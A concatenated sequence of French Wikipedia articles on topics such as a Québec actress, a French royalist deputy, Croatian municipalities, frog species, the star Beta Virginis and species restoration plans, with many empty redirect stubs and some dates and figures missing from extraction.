Bella Ouellette, de son vrai nom Agnès Martine Ouellette, née à Montréal le et décédée à Montréal le , est une comédienne québécoise.
Elle travaille essentiellement sur les scènes des théâtres et à la radio.
Biographie.
Bella Ouellette fait ses débuts à l'âge de treize ans à côté de M. Louis Labelle et Mme Blanche de La Sablonnière, artistes célèbres à l'époque. Elle fait ses débuts professionnels au Monument-National (Montréal) avec Paul Cazeneuve.
Par la suite, Bella Ouellette connait une grande carrière sur les scènes des théâtres montréalais du début des années 1900 jusqu'à la fin des années 1930. Elle est l'actrice principale de la troupe de Julien Daoust. 
Elle épouse Julien Daoust le , à Ste-Brigide, Montréal. Ils se séparent en 1919 et elle crée sa propre troupe de théâtre en 1922 avec Jeanne Demons (la "Troupe Ouellette-Demons") 
D'ailleurs, au cours des années 1920, elle est considérée comme l'une des grandes actrices de théâtre du Québec. 
Au début des années 1930, elle est active au sein de la troupe de théâtre que Fred Barry, mise sur pied avec le comédien Albert Duquesne. La "Troupe Barry-Duquesne" s'installe dès le début au cinéma Chanteclerc (à Montréal), connu éventuellement sous le nom de "Théâtre Stella." Fred Barry et Albert Duquesne sont entourés au sein de cette troupe par Bella Ouellette, Marthe Thiéry, Antoine Godeau, Pierre Durand, Mimi d'Estée, Henry Deyglun, Jeanne Demons et Gaston Dauriac. La "Troupe Barry-Duquesne", accompagnée du Quatuor Alouette, s'embarque pour Paris en 1937. Bella Ouellette et les autres membres de la troupe y jouent une pièce d'Henry Deyglun, "Vers la terre canadienne". Pour la première fois, une troupe québécoise présente une pièce du Québec en France.
Devant le marasme que connaît le théâtre à Montréal à partir des années 1930, elle se tourne aussi vers la radio et joue en fin de carrière dans les premiers feuilletons radiophoniques tel "Un homme et son péché". 
Elle épouse Fred Barry en 1944.
Le fonds d'archives de Fred Barry et Bella Ouellette est conservé au centre d'archives de Montréal à la Bibliothèque et Archives nationales du Québec.

</doc>
<doc id="3216744" url="https://fr.wikipedia.org/wiki?curid=3216744" title="BATMAN">
BATMAN



</doc>
<doc id="3216749" url="https://fr.wikipedia.org/wiki?curid=3216749" title="Georges Félix de Wimpfen">
Georges Félix de Wimpfen



</doc>
<doc id="3216759" url="https://fr.wikipedia.org/wiki?curid=3216759" title="Georges Gamard">
Georges Gamard

Georges Gamard, né le à Paris et mort le à Deux-Évailles, est un homme politique français. Député de la Mayenne de 1892 à 1898, il est membre d'honneur de l'Université de Paris.
Biographie.
Origine.
Petit-fils d'un notaire et fils d'un avoué près du tribunal de la Seine.
Il est le neveu d'Alexandre Bourdon du Rocher, député de la Sarthe de 1827 à 1830, maître de forges, et de de Ferdinand Pierre Agathe Bourdon (1773-1805), colonel du régiment de dragons tué lors de la bataille d'Austerlitz le .
Notaire.
A l'exemple de son grand-père, il embrassa la carrière de notaire, succédant à Me Watin, dans l'étude de la Rue de Choiseul. Il exerce comme notaire à Paris de 1864 à 1893, et devient notaire honoraire à son retrait en 1893. 
Lors de la guerre franco-allemande de 1870, il effectue la campagne militaire dans les bureaux de l'Intendance.
Homme politique.
Il est en 1881, candidat conservateur, et élu conseiller municipal du quartier Gaillon, où se trouvait son étude de notaire, dans le de Paris. Il est réélu en 1884, 1887 et 1890 et membre de la minorité conservatrice. Son successeur M. de Lassus échoue en 1892 aux élections municipales de Paris contre le candidat républicain Félix Blachette.
Monarchiste, il assiste aux obsèques d'Henri d'Artois, comte de Chambord, qui ont lieu le 3 septembre 1883 dans la Cathédrale de Gorizia. Le comte de Chambord n'ayant pas eu d'enfant, les royalistes étaient partagés entre deux possibilités. Gamard se joint sans hésitation à l'option Orléaniste, soutenant Philippe d'Orléans, comte de Paris. Lors de l'exil du comte de Paris et de sa famille, à la suite de la Loi du 22 juin 1886 relative aux membres des familles ayant régné en France, il salue la famille royale au château d'Eu, et est présent lors de leur embarquement au Tréport pour gagner une nouvelle fois l'Angleterre. A la mort du Comte de Paris, il effectue le pèlerinage à la résidence anglaise de Stowe House et à à la chapelle Saint-Charles Borromée de Weybridge, et acclamer Philippe d'Orléans prétendant orléaniste au trône de France sous le nom de « .
Journalisme.
Il a une grande influence dans les journaux parisiens, en particulier "La Libre Parole", "L'Autorité", et "Le Soleil", dont il est membre du Conseil d'Administration.
La Mayenne.
Extrêmement riche, il achète en 1887 la terre de Trancalou à Deux-Evailles. Il construit à Deux-Evailles en 1887 l'actuel château de Trancalou à deux kilomètres à l'est du bourg, qui est pour l'extérieur la reproduction d'un château anglais du comté de Surrey. Il est châtelain de Deux-Évailles à la belle-saison. Inscrit électoralement depuis 1889 à Deux-Évailles, il est membre du conseil général de la Mayenne en 1892, président du Comice agricole de Montsûrs, et membre de la Société des agriculteurs de France.
À la suite du décès en 1892 de Charles Théophile de Plazanet, il est élu député député de la de l'arrondissement de Laval. Il remporte l'élection contre Charles Lecomte. La campagne s'est déroulée dans une atmosphère délétère, les conservateurs entretenant la rumeur de sa mort, tout en achetant un certain nombre de voix populaires.
Il est décrit en 1893 par le préfet de la Mayenne comme un Orléaniste "membre de cette bourgeoisie voltairienne dans les premières années du siècle, devenue avec le temps plus cléricale que le Pape". Il est très bien vu à l'archevêché de Paris, et a pour neveu le cardinal François-Marie-Benjamin Richard.
Il fait partie de la droite royaliste et du groupe agricole. Il sera membre de la commission d'enquête sur l'affaire de Panama.
Il est réélu aux élections législatives de 1893. En 1896, il effectue un voyage à Vienne pour assister au mariage de Philippe d'Orléans avec Marie-Dorothée de Habsbourg-Lorraine. Resté monachiste instransigeant, et en dehors de l'Esprit nouveau comme par exemple Christian d'Elva, il s'associe aux Intransigeants de gauche et de droite pour refuser la politique du gouvernement Méline.
Il perd aux élections législatives de 1898 contre Louis Heuzey, le candidat républicain. Il perd aussi son siège au Conseil général de la Mayenne pour le canton de Montsûrs aux Élections cantonales de 1898.
Outre le château moderne de Trancalou, Deux-Evailles lui doit la construction de son église et de son école. Il meurt dans son château le , et est inhumé au cimetière du Père-Lachaise à Paris.
Famille.
En 1919, sa veuve, née Rivierre, est une des propriétaires du "Courrier du Maine". Mme Gamard a été l'une des principales organisatrices du Comité des Dames Royalistes de la Seine, dont une des présidentes fut Anne de Rochechouart de Mortemart.
Le couple n'a pas d'enfants et reporta son affection sur ses neveux.

</doc>
<doc id="3216760" url="https://fr.wikipedia.org/wiki?curid=3216760" title="Saint-Amand (auteur)">
Saint-Amand (auteur)

Jean-Armand Lacoste, dit « Saint-Amand », né à Paris le et mort à Paris le , est un dramaturge français.
Saint-Amand a été, en collaboration avec Benjamin Antier et Polyanthe, l’auteur du fameux drame "l’Auberge des Adrets".

</doc>
<doc id="3216768" url="https://fr.wikipedia.org/wiki?curid=3216768" title="Légende de Duluoz">
Légende de Duluoz



</doc>
<doc id="3216769" url="https://fr.wikipedia.org/wiki?curid=3216769" title="Pokupsko">
Pokupsko

Pokupsko est un village et une municipalité située dans le comitat de Zagreb, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 99,28 % de Croates et le village seul comptait 259 habitants.
Localités.
La municipalité de Pokupsko compte 14 localités :

</doc>
<doc id="3216770" url="https://fr.wikipedia.org/wiki?curid=3216770" title="Meathook seed">
Meathook seed



</doc>
<doc id="3216771" url="https://fr.wikipedia.org/wiki?curid=3216771" title="Medhy custos">
Medhy custos



</doc>
<doc id="3216775" url="https://fr.wikipedia.org/wiki?curid=3216775" title="Pojezerje">
Pojezerje

Pojezerje est une municipalité située en Dalmatie, dans le comitat de Dubrovnik-Neretva, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 97,81 % de Croates.
Le siège de la municipalité est le village d'Otrić-Seoci.
Localités.
La municipalité de Pojezerje compte 6 localités :

</doc>
<doc id="3216777" url="https://fr.wikipedia.org/wiki?curid=3216777" title="Paul Brocchi">
Paul Brocchi

Paul Louis Antoine Brocchi est un médecin, un agronome et un naturaliste français né le à Nancy et mort le à Paris.
Biographie.
Il obtient une thèse de science à la Sorbonne en 1875. Sa thèse qui porte sur les crustacés décapodes est dirigée par Henri Milne Edwards (1800-1885). Après l’obtient d’un titre de docteur en médecine, il enseigne à l’École des hautes études durant 25 ans. Parallèlement, il succède à Émile Blanchard (1819-1900) à l’Institut agronomique.
Il étudie l’anatomie des crustacés, l’ostréiculture mais aussi de très nombreux sujets liés à l’amélioration des pratiques agricoles comme l’élevage du bétail, l’aquaculture, l’apiculture ou la sériciculture. En hommage aux services rendues pour l’agriculture française, il reçoit la Légion d'honneur en .
Brocchi est aussi l’auteur de publications sur les amphibiens d’Amérique et d’Océanie en décrivant les espèces récoltées durant plusieurs missions scientifiques. Il est l’auteur de plusieurs dizaines de nouvelles espèces.

</doc>
<doc id="3216778" url="https://fr.wikipedia.org/wiki?curid=3216778" title="Paul Louis Antoine Brocchi">
Paul Louis Antoine Brocchi



</doc>
<doc id="3216781" url="https://fr.wikipedia.org/wiki?curid=3216781" title="Adams Museum">
Adams Museum

L'Adams Museum est un musée situé dans la ville de Deadwood dans le Dakota du Sud.
Histoire.
L'Adams Museum est le plus ancien musée des Black Hills, dans le Dakota du Sud. Un homme d'affaires, W. E. Adams, construit ce musée en 1930 à la mémoire des familles de pionniers ayant vécu dans les Black Hills. 
La maison Adams, qui abrite le musée, a été construite en 1892, dans le style victorien. L'Adams Museum &amp; House, Inc. est un organisme à but non lucratif et gère l'Adams Museum de Deadwood.

</doc>
<doc id="3216782" url="https://fr.wikipedia.org/wiki?curid=3216782" title="Nature de la lumière">
Nature de la lumière



</doc>
<doc id="3216783" url="https://fr.wikipedia.org/wiki?curid=3216783" title="Podturen">
Podturen

Podturen est un village et une municipalité située dans le comitat de Međimurje, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 94,81 % de Croates et le village seul comptait habitants.
Localités.
La municipalité de Podturen compte 6 localités :

</doc>
<doc id="3216785" url="https://fr.wikipedia.org/wiki?curid=3216785" title="Lithobates warszewitschii">
Lithobates warszewitschii

Lithobates warszewitschii est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce se rencontre du niveau de la mer jusqu'à d'altitude au Honduras, au Nicaragua, au Costa Rica et au Panama.
Habitat.
"Lithobates warszewitschii" vit en milieu très humide sur le sol des forêts.
Description.
"Lithobates warszewitschii" mesure jusqu'à pour les mâles et pour les femelles. Les têtards mesurent quant à eux jusqu'à .
Étymologie.
Cette espèce est nommée en l'honneur de Józef Warszewicz (1812-1866).

</doc>
<doc id="3216786" url="https://fr.wikipedia.org/wiki?curid=3216786" title="Ranula chrysoprasina">
Ranula chrysoprasina



</doc>
<doc id="3216787" url="https://fr.wikipedia.org/wiki?curid=3216787" title="Rana coeruleopunctata">
Rana coeruleopunctata



</doc>
<doc id="3216795" url="https://fr.wikipedia.org/wiki?curid=3216795" title="Caractère de l’action">
Caractère de l’action



</doc>
<doc id="3216796" url="https://fr.wikipedia.org/wiki?curid=3216796" title="Mode d'action">
Mode d'action

Mode d'action peut faire référence à :

</doc>
<doc id="3216797" url="https://fr.wikipedia.org/wiki?curid=3216797" title="Modalité d'action">
Modalité d'action



</doc>
<doc id="3216799" url="https://fr.wikipedia.org/wiki?curid=3216799" title="La Légende de Duluoz">
La Légende de Duluoz

La Légende de Duluoz ("The Duluoz Legend") est le nom générique donné par l'écrivain américain Jack Kerouac à la majeure partie de son œuvre, dont il disait lui-même que :
Liste des œuvres.
Les romans composant "la Légende de Duluoz" correspondent à ceux de la liste suivante, dans l'ordre chronologique des périodes narrées :
Note : Les deux livres dont les titres suivent sont parfois inclus dans la Légende de Duluoz : 

</doc>
<doc id="3216800" url="https://fr.wikipedia.org/wiki?curid=3216800" title="Pseudorana weiningensis">
Pseudorana weiningensis

Pseudorana weiningensis est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce est endémique de République populaire de Chine. Elle se rencontre :
Étymologie.
Son nom d'espèce, composé de "weining" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, le xian de Weining au Guizhou.

</doc>
<doc id="3216803" url="https://fr.wikipedia.org/wiki?curid=3216803" title="Podstrana">
Podstrana

Podstrana est un village et une municipalité située dans le comitat de Split-Dalmatie, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 97,28 % de Croates et le village seul comptait également habitants.
Localités.
En 2001, la municipalité de Podstrana ne comptait qu'une seule localité, le village éponyme de Podstrana. Depuis 2006, la municipalité, réorganisée, compte 7 localités :

</doc>
<doc id="3216811" url="https://fr.wikipedia.org/wiki?curid=3216811" title="Odorrana wuchuanensis">
Odorrana wuchuanensis

Odorrana wuchuanensis est une espèce d'amphibiens de la famille des Ranidae.
Répartition.
Cette espèce est endémique de la ville-district de Wuchuan dans la province de Guizhou en République populaire de Chine. Elle n'est connue pour l'instant que dans une grotte de Baicun à environ d'altitude.
Étymologie.
Son nom d'espèce, composé de "wuchuan" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, la ville-district de Wuchuan.

</doc>
<doc id="3216817" url="https://fr.wikipedia.org/wiki?curid=3216817" title="Podravske Sesvete">
Podravske Sesvete

Podravske Sesvete est un village et une municipalité située dans le comitat de Koprivnica-Križevci, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 99,38 % de Croates et le village seul comptait également habitants.
Localités.
La municipalité de Podravske Sesvete ne compte qu'une seule localité, le village éponyme de Podravske Sesvete.

</doc>
<doc id="3216818" url="https://fr.wikipedia.org/wiki?curid=3216818" title="Complexité amortie d'une structure de donnée">
Complexité amortie d'une structure de donnée



</doc>
<doc id="3216821" url="https://fr.wikipedia.org/wiki?curid=3216821" title="Piotr Małachowski">
Piotr Małachowski

Piotr Małachowski (né le à Żuromin) est un athlète polonais, spécialiste du lancer du disque. Il est le premier athlète polonais de cette discipline à remporter un titre mondial, à Kazan en 2015.
Biographie.
Il se révèle durant les Championnats d'Europe espoirs 2005 d'Erfurt en se classant deuxième derrière l'Allemand Robert Harting. Sixième des Championnats d'Europe 2006, il remporte l'épreuve du lancer du disque des coupes d'Europe des nations 2006 et 2007. Sélectionné pour les Jeux olympiques de Pékin, en 2008, Piotr Małachowski monte sur la deuxième marche du podium avec 67,82 m, devancé d'exactement un mètre par l'Estonien Gerd Kanter.
En 2009, le Polonais remporte la médaille d'argent lors des Championnats du monde de Berlin, établissant avec 69,15 m, un nouveau record national de Pologne.
Le à Barcelone, Piotr Małachowski remporte son premier succès international majeur en devenant champion d'Europe du lancer du disque. Auteur de 68,87 m réalisés à son deuxième essai, il devance de quarante centimètres l'Allemand Robert Harting. Il remporte l'épreuve du lancer du disque de la Ligue de diamant 2010.
Le , lors des Fanny Blankers-Koen Games d'Hengelo aux Pays-Bas, Piotr Małachowski atteint la marque de et améliore de près de le record de Pologne qu'il détenait depuis la saison 2010. Ce lancer constitue la septième meilleure performance de tous les temps.
Le , aux championnats du monde à Moscou, il obtient sa deuxième médaille d'argent dans cette compétition, avec un lancer à 68,36 m.
Le , il établit sa meilleure performance de la saison, avec un lancer à 68,29 m à Cetniewo. Le , il remporte son premier titre mondial devant Philip Milanov et Robert Urbanek, profitant de l'absence de Robert Harting.
Le , il remporte la Doha Diamond League 2016 avec 68,03 m, meilleure performance mondiale de l'année. Le , Malachowski remporte son titre continental (après 2010), à l'occasion des Championnats d'Europe d'Amsterdam : il s'impose avec 67,06 m. En août, il participe à la finale des Jeux olympiques de Rio et remporte une nouvelle médaille d'argent avec un jet à 67,55 m (après 2008), battu par l'Allemand Christoph Harting (68,37 m).
Durant sa carrière, il a représenté les clubs du WMKS Płońsk, Skra Varsovie (2001-2002), AZS-AWF Varsovie (2003-2004) et Śląsk Wrocław (depuis 2004).

</doc>
<doc id="3216851" url="https://fr.wikipedia.org/wiki?curid=3216851" title="Tim Berne">
Tim Berne

&lt;dfn&gt;Tim Berne&lt;/dfn&gt;, né en 1954, est un saxophoniste et compositeur de jazz américain. 

</doc>
<doc id="3216854" url="https://fr.wikipedia.org/wiki?curid=3216854" title="Croato-serbe">
Croato-serbe



</doc>
<doc id="3216861" url="https://fr.wikipedia.org/wiki?curid=3216861" title="Élection présidentielle colombienne 2006">
Élection présidentielle colombienne 2006



</doc>
<doc id="3216863" url="https://fr.wikipedia.org/wiki?curid=3216863" title="Tournoi de tennis de Monte-Carlo (ATP 2004)">
Tournoi de tennis de Monte-Carlo (ATP 2004)

L'édition 2004 du tournoi de tennis de Monte-Carlo se déroule du 19 au sur terre battue en extérieur. Il s'agit du de la saison. Guillermo Coria remporte l'épreuve de simple, Tim Henman et Nenad Zimonjić celle de double.
Faits marquants.
Forfaits.
On note le forfait d'Andy Roddick pour incompatibilité de calendrier, l'Américain ayant atteint la finale d'Houston la semaine précédente. Ses compatriotes Mardy Fish et James Blake déclarent eux aussi forfait.
Lauréats.
Guillermo Coria remporte son en simple en battant en finale le tenant du titre Rainer Schüttler. Il s'agit du et sur terre battue en carrière de l'Espagnol. Il s'impose pour la à Monte-Carlo, soulevant ainsi son de la saison.
En double, Tim Henman et Nenad Zimonjić remportent leur ensemble en battant en finale la paire argentine Gastón Etlis et Martín Rodríguez. Il s'agit de leur et respectif dans la discipline.

</doc>
<doc id="3216864" url="https://fr.wikipedia.org/wiki?curid=3216864" title="Vuk Karadžić">
Vuk Karadžić



</doc>
<doc id="3216875" url="https://fr.wikipedia.org/wiki?curid=3216875" title="Beta Virginis">
Beta Virginis

Beta Virginis ( ; Bêta de la Vierge) dans la Désignation de Bayer est une étoile de la constellation de la Vierge située à de la Terre.
Nomenclature.
Zavijava est le nom aujourd’hui retenu par l'Union astronomique internationale (UAI). Il fut introduit sous cette forme, qui porte la marque des transcriptions latines dues à des italianophones, par Giuseppe Piazzi (1814) à partir de la transcription "Zawiyat AlAuwá" donnée par Thomas Hyde (1665) dans sa traduction du traité d'al-Tīzīnī ‘l-Muwaqqit (1533), en annexe de celle du یجِ سلطانی "Zīğ-i Sulṭānī" ou « Tables sultaniennes » d’Uluġ Bēg (1437) du traité d’Uluġ Bēg (1437).
C’est à l’origine l’arabe زاوية العواء "Zāwiya al-ᶜAwwā’", littéralement « l’Angle du Hurleur », sachant qu"'al-ᶜAwwā’", littéralement « le Hurleur », désigne le groupe "βηγδε Vir", lequel se présente sous la forme d’un angle ouvert, et qui constitue la XIII " manāzil al-qamar" ou « stations lunaires.
Propriétés.
Beta Virginis est une naine jaune-blanc de type spectral F9 ; sa taille est de 66 % et sa masse de 25 % supérieure à celle du Soleil. Cette étoile faisait partie des 100 étoiles comprises dans le projet Terrestrial Planet Finder de la NASA qui a pour objectif de détecter et d'étudier des planètes telluriques.
Beta Virginis a été utilisée durant l' pour confirmer la théorie d'Albert Einstein en déterminant la vitesse de la lumière par la mesure de son déplacement apparent du fait de la masse du Soleil.
Se situant près de l'écliptique, elle peut être occultée par la Lune et plus rarement par les planètes. Elle sera occultée par Vénus le .
Dans la fiction.
L'étoile est citée dans le roman "Tau Zéro" de Poul Anderson, dans lequel un vaisseau spatial est envoyé en direction de cette étoile afin que les humains colonisent une planète dans son système. 

</doc>
<doc id="3216879" url="https://fr.wikipedia.org/wiki?curid=3216879" title="Entomologique">
Entomologique



</doc>
<doc id="3216882" url="https://fr.wikipedia.org/wiki?curid=3216882" title="Vinícius Reche">
Vinícius Reche

Vinícius Cunha Reche, né le à São Paulo, est un ancien footballeur brésilien. Lors de sa carrière, il a principalement joué comme milieu offensif.
Biographie.
Le Brésilien inscrit son premier but sous les couleurs angevines face à Boulogne-sur-Mer sur une passe de Charles Diers (score final : 2-3, première victoire à l'extérieur d'Angers SCO en 2008-2009).

</doc>
<doc id="3216885" url="https://fr.wikipedia.org/wiki?curid=3216885" title="Stéphane Ruais">
Stéphane Ruais

Stéphane Ruais, né le à Boulogne-Billancourt, est un peintre français.
Il est un marin de longue date qui navigue sur ses propres bateaux dans le Finistère Nord. Son atelier est situé à Tréflez.
Sa peinture est imprégnée de ses courses en solitaire, avec de nombreux paysages côtiers, mais les sujets sont divers (avions, natures mortes, arsenaux...). Les caractères dominants de son expression artistique sont la lumière et le mouvement, une peinture d'atmosphère par touche rapide qui saisit la lumière et valorise la transparence des éclairages. Il travaille exclusivement sur le motif.
Stéphane Ruais a été nommé Peintre officiel de la Marine en 1991 et Peintre officiel de l'Air en 2000. II a participé à plusieurs ouvrages collectifs dont "Les Peintres Officiels de la Marine en escale à Nice" (Éditions le Télégramme).
Style.
Peintre de paysage, il se réclame de quelques grands maîtres. Camille Pissarro, pour la nature et la fraîcheur de ses verts, Claude Monet pour ses lumières dorées, et surtout Chaïm Soutine, pour sa matière sensuelle et sa palette de couleurs. Ruais se situe, aussi, dans le sillage de Marin-Marie, aquarelliste de génie, même s'il a délaissé cette technique qu'il trouve trop imprévisible.
Peintre de la Marine depuis 1991, assimilé au grade de capitaine de corvette, Stéphane Ruais est un peintre côtier. "« Le grand large m'ennuie »", reconnaît-il, passionné par l'estran et ses rochers, et nostalgique de ses jeunes années lorsqu'il débarquait sur une île, prêt à cabaner pour la nuit. La grand-voile affalée, à cheval sur la bôme en guise de toile de tente, et les étoiles comme compagnons.

</doc>
<doc id="3216889" url="https://fr.wikipedia.org/wiki?curid=3216889" title="Maria del Rosario Espinoza">
Maria del Rosario Espinoza



</doc>
<doc id="3216891" url="https://fr.wikipedia.org/wiki?curid=3216891" title="Accueil">
Accueil



</doc>
<doc id="3216898" url="https://fr.wikipedia.org/wiki?curid=3216898" title="Microrégion de Garanhuns">
Microrégion de Garanhuns

La microrégion de Garanhuns est l'une des six microrégions qui subdivisent l'Agreste de l'État du Pernambouc au Brésil.
Elle comporte dix-neuf municipalités.
Municipalités.
Liste des municipalités de la microrégion :

</doc>
<doc id="3216905" url="https://fr.wikipedia.org/wiki?curid=3216905" title="Microrégion du Brejo Pernambucano">
Microrégion du Brejo Pernambucano

La microrégion du Brejo Pernambucano est l'une des six microrégions qui subdivisent l'Agreste de l'État du Pernambouc au Brésil.
Elle comporte onze municipalités.
Municipalités.
Liste des municipalités de la microrégion :

</doc>
<doc id="3216911" url="https://fr.wikipedia.org/wiki?curid=3216911" title="Canard-WC">
Canard-WC

Canard-WC est une marque de produits d'entretien pour les toilettes produite par la société S. C. Johnson. La marque a été déposée en par la société suisse .
L'origine du nom vient du fait que le haut du flacon avait une forme de bec afin de déposer le produit nettoyant sous le bord des toilettes. Cette innovation est due à Walter Düring.
En 2008, la société Düring SA vend la licence d'exploitation de la marque Canard-WC à S. C. Johnson.
L'inventeur du flacon « au cou de canard », Walter Düring est décédé en 2017.
Slogans.
Ancien slogan : « encore une victoire de canard ».
Le dernier slogan publicitaire est « Comptez sur Canard ! ».

</doc>
<doc id="3216913" url="https://fr.wikipedia.org/wiki?curid=3216913" title="Razor">
Razor

Razor peut désigner :

</doc>
<doc id="3216915" url="https://fr.wikipedia.org/wiki?curid=3216915" title="Laranjeiras (Sergipe)">
Laranjeiras (Sergipe)

Laranjeiras est une ville brésilienne du nord-est de l'État du Sergipe.
Géographie.
Laranjeiras se situe par une latitude de 10° 48' 22" sud et par une longitude de 37° 10' 18" ouest, à une altitude de 9 mètres.
Sa population était de habitants au recensement de 2007. La municipalité s'étend sur .
Elle fait partie de la microrégion du Baixo Cotinguiba, dans la mésorégion Est du Sergipe.

</doc>
<doc id="3216916" url="https://fr.wikipedia.org/wiki?curid=3216916" title="Puerto Lumbreras">
Puerto Lumbreras

Puerto Lumbreras est une commune espagnole située dans la région de Murcie. La population s'élève à habitants en 2020.
Géographie.
Elle s'étend sur dans l'extrême sud-ouest de la région et est limitrophe de l'Andalousie.
Histoire.
Le une forte crue touche la ville ; un grand nombre d'habitations sont détruites et près de trouvent la mort. La ville restée fortement marquée par la catastrophe abrite un mémorial en l'honneur des victimes.

</doc>
<doc id="3216919" url="https://fr.wikipedia.org/wiki?curid=3216919" title="Powiat de Kedzierzynsko-Kozielski">
Powiat de Kedzierzynsko-Kozielski



</doc>
<doc id="3216921" url="https://fr.wikipedia.org/wiki?curid=3216921" title="Plan de restauration">
Plan de restauration

Un plan de restauration, ou plan national d'action (PNA en France) est, dans le domaine de l'écologie et de la biologie de la conservation, un plan visant, via une gestion restauratoire à restaurer une population viable (et donc aussi le cas échéant l'habitat) d'une espèce vulnérable, disparue ou en danger d'extinction. De manière générale, un plan de restauration peut être régional ou décliné localement.
Contenus.
Chaque plan définit et programme la mise en œuvre d'actions coordonnées, nécessaires à la restauration d’espèces menacées sur le territoire concernée (national et européen par exemple en Belgique). En France ses objectifs sont d'organiser la surveillance des populations et espèces concernées, de mettre en œuvre des « actions coordonnées favorables à la restauration ou au rétablissement de ces espèces ou de leurs habitats », d' « informer les acteurs concernés et le public et de faciliter l’intégration de la protection des espèces dans les activités humaines et dans les politiques publiques d’infrastructures ».
Il liste généralement :
Espèces-cibles.
Un tel plan peut concerner toutes sortes d'espèces : animales, végétales ou fongiques. 
Certains plans ne concernent qu'une seule espèce (exemple : "Liparis de Loesel)", d'autres visant un groupe fonctionnel d'espèces (exemple : « Plan Odonates », Plan « vieux-bois/bois mort », « Pollinisateurs » ou « Plan Chiroptères » (déclinés en région) en France).
Il s'agit souvent d'espèces dites patrimoniales et parfois d'espèces considérées comme de la nature banale, mais en forte régression (exemple : hirondelle ou moineau domestique dans les grandes villes d'Europe de l'Ouest, ou abeilles), y compris d'espèces surexploitées que l'on souhaite « restaurer » pour leur valeur commerciale et/ou halieutique (esturgeon européen, cabillaud ou anguille d'Europe par exemple). L'objectif premier est généralement de contribuer à la restauration de la biodiversité, mais dans certains cas (restauration de populations viables d'abeilles pollinisatrices par exemple), l'enjeu est également économiquement crucial.
Aires de travail.
Un plan de restauration peut être local, régional, national ou bio-régional, et transfrontalier et/ou maritime le cas échéant. 
Pour des raisons écologiques et de pragmatisme, il est souvent « multi-échelle » (par exemple un plan national décliné en plans régionaux) et peut concerner plusieurs espèces. Ainsi, le « plan français de restauration des tortues marines des Antilles françaises » concerne des îles éloignées les unes des autres et plusieurs espèces migratrices (tortue imbriquée, tortue verte, tortue luth, tortue caouanne, tortue olivâtre). Il a donc été subdivisé en :
Responsabilité.
Il est généralement supervisé par l'autorité nationale chargée de la protection de la nature, mais il s'appuie sur un réseau coordonné de spécialistes, et de plus en plus sur une dynamique de large concertation.
Conditions de réalisation.
Les autorités responsables doivent trouver les compétences et le budget nécessaire. Elles recherchent, via un dispositif d'animation et d'évaluation une concertation approfondie avec les responsables et acteurs des secteurs agricole, sylvicole ou cynégétique ou halieutique lorsqu'ils sont éventuellement concernés par l'impact de la présence d'une espèce (ex : prédation sur troupeaux, nécessitant remboursement et/ou protection des troupeaux). 
Des études de terrain (dont d"'écologie rétrospective" le cas échéant) déterminent les zones concernées par le plan, en recherchant la meilleure compatibilité entre les besoins de l'espèce et ceux des populations locales. Les indemnisations en cas de dégâts sont souvent une des conditions posées par les acteurs locaux. Des aménagements locaux sont possibles (gardiennage, clôtures, pas canadien, système de veille et d'alerte). À titre d'exemple, en France, le Plan Ours a été accompagné d'un « plan de soutien à l'économie de montagne » (PSEM).
Un protocole d'évaluation est associé à chaque plan, avec des mises à jour corrective, sur la base d'évaluations à mi parcours.
Techniques utilisables pour les plans de restauration.
Il existe plusieurs méthodes pour tirer des informations utiles à l’élaboration de plans de restauration, chacune présente des avantages et des inconvénients :
Les techniques traditionnelles sont les lignes de transects et les méthodes de quadrats. Cependant, ces méthodes sont coûteuses et nécessite beaucoup d’efforts ainsi que des ressources humaines importantes.
Pour cette raison, les technologies avancées de télédétection utilisant l’imagerie satellitaires sont majoritairement utilisées pour les études portant sur l'écologie. Elles ont l’avantage de fournir des réponses rapides et précises à moindre coûts. Cependant, elles présentent également des limitations quant à leur résolution qui ne permet pas de détecter et de distinguer les différentes espèces de végétation désertique par exemple.
L’idée de projet d’utilisation de drones comme technologies avancées à haute résolution ont été mis à l’épreuve afin de contrer les problèmes dus à la résolution de l’imagerie satellitaires. Une étude a montré que les drones pourraient être utilisés en complément des techniques actuellement utilisés. D’autres études seront nécessaires afin de pouvoir manier ce nouvel outil de façon optimale.
Législation.
Ces actions concernent généralement des espèces figurant sur des listes rouges d'espèces menacées et strictement protégées par plusieurs conventions internationales (CITES, convention de Berne…) et en Europe par des directives européennes (habitat faune, flore, OSPAR). Elles s'insèrent dans la charte mondiale de la nature (adoptée par l’Assemblée générale des Nations unies le , qui reconnaît que la vie humaine « dépend du fonctionnement ininterrompu des systèmes naturels ». 
Des plans de conservation d'espèce à échelle européenne, par exemple pour l'esturgeon sont en cours d'établissement, dans le cadre de la convention de Berne. 
Ces plans sont donc précisément cadrés par le droit international et le droit de l'environnement local.
Législation française.
Ces plans étaient en France pour 2009 cadrés (à la suite du Grenelle de l'Environnement) par une circulaire d', qui annonce une autre circulaire qui formalisera la doctrine et les modalités pour l’élaboration, la mise en œuvre, le suivi et l’évaluation de ces plans de restauration. Le MEEDDAT proposera annuellement une liste d’espèces prioritaires pour la faune et pour la flore.
En 2010, la loi Grenelle II a intégré dans le code de l'Environnement : les .
Un décret précisera, en tant que de besoin, les modalités d’application de la loi.
Exemples.
En France.
La France a à partir de 1996 et avec le MNHN initié des "Plans de restauration nationaux" pour certaines espèces en mauvais état de conservation. 
Dans le cadre de la Stratégie nationale pour la biodiversité adoptée en 2004 et des engagements français et européens à bloquer la perte de biodiversité avant 2010, la Direction de la Nature et des Paysages, au sein du ministère chargé de la protection de la nature a mis en place des plans de restauration nationaux pour un certain nombre d'espèces ou de groupes. 
Ces plans s'appuient sur les structures scientifiques nationales et locales, des acteurs de terrain et des budgets dédiés (abondés par des financements européens (voir mesures agri-environnementales notamment). 
Ils sont établis sous l'égide d'un Comité de Pilotage et validés à plusieurs échelles, par le CSRPN (Conseil scientifique régional du patrimoine naturel) puis par le CNPN (Conseil national de protection de la nature).
